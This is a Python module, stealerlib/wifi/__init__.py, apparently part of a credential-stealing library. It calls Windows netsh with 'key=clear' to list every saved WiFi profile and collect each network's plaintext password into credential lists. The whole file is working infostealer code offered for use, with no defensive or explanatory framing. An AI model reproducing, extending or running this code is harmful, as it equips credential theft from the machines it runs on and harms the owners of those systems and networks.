#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/wifi/__init__.py
"""

import subprocess

from dataclasses import dataclass
from typing import Union, Optional

from stealerlib.exceptions import catch

from stealerlib.wifi.types import WiFiTypes


class WiFi:
    """This class provides methods for extracting and parsing information from connected WiFi stations

    Attributes:
        ssids           A list of Parsed WiFi SSID's
        passwords       A list of Parsed WiFi Passwords
        credentials     A list of tuples (or StealerLib objects) containing the WiFi's SSID and password (if parsed)
    """

    def __init__(self):
        self.ssids = []
        self.passwords = []
        self.credentials = []

    @staticmethod
    def get_wifi_profiles() -> list:
        """Retrieves all wifi profiles from the system -- Not implemented into get_wifi_passwords yet

        Returns:
            list: A list of all available WiFi profile names
        """

        args = ['netsh', 'wlan', 'show', 'profiles']
        data = subprocess.check_output(args)
        data = data.decode('utf-8', errors="backslashreplace").split('\n')

        profiles = [
            row.split(":")[1][1:-1] for row in data if "All User Profile" in row
        ]

        return profiles

    @staticmethod
    def get_profile_info(profile: str) -> list:
        """Retrieves wifi profile information for a given profile name -- Not implemented into get_wifi_passwords yet

        Parameters:
            profile (str): The name of the WiFi profile to look up

        Returns:
            list: A list of the profile information
        """

        args = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
        data = subprocess.check_output(args)
        data = data.decode('utf-8', errors="backslashreplace").split('\n')

        content = [
            row.split(":")[1][1:-1] for row in data if "Key Content" in row
        ]

        return content

    @catch
    def get_wifi_passwords(
        self,
        conv: Optional[bool]=True
    ) -> list[Union[list, WiFiTypes.SSID]]:
        """Gets all wifi profiles and their passwords from the system

        Parameters:
            self (object): The object passed to the method
            conv (bool): Whether to return the data as a list of information or a StealerLib object

        Returns:
            list: A list of WiFi logins appended as a list of values or StealerLib objects

        Example:
            network = WiFi()
            network.get_passwords()
        """

        profiles = WiFi.get_wifi_profiles()

        for profile in profiles:
            try:
                profile_info = WiFi.get_profile_info(profile)

                try:
                    password = profile_info[0]
                except IndexError:
                    password = "No Password"
            except subprocess.CalledProcessError:
                password = "Encoding Error"

            obj_ssid = WiFiTypes.SSID(profile, password)

            self.ssids.append(obj_ssid.profile)
            self.passwords.append(obj_ssid.password)
            self.credentials.append(
                obj_ssid.conv() if conv else obj_ssid
            )

        return self.credentials
